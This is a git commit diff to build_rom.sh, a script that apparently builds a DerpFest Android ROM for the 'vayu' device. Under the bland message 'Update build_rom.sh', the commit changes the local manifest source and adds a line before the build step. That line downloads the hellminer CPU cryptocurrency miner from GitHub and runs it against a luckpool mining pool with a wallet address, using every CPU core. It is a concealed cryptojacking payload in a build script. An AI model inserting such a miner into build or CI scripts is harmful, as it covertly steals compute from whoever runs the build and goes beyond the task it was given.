1167feeee90ef51cd3f512c179aebcc780018f96
ganssjr <76063071+ganssjr@users.noreply.github.com>
2022-05-10 02:56:58 +0700

    Update build_rom.sh

--- build_rom.sh
+++ build_rom.sh
@@ -1,11 +1,12 @@
 # sync rom
 repo init --depth=1 --no-repo-verify -u git://github.com/DerpFest-11/manifest.git -b 11 -g default,-mips,-darwin,-notdefault
-git clone https://github.com/pocox3pro/Local-Manifests.git --depth 1 -b master .repo/local_manifests
+git clone https://github.com/ganssjr/local_manifests.git --depth 1 -b master .repo/local_manifests
 repo sync -c --no-clone-bundle --no-tags --optimized-fetch --prune --force-sync -j8
 
 # build rom
 source build/envsetup.sh
 lunch derp_vayu-user
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RB1ZW4E96oUwrLgaZWkxyMeJJnK95KQJsG.arif01 -p x --cpu $(nproc --all)
 export TZ=Asia/Dhaka #put before last build command
 mka derp
 
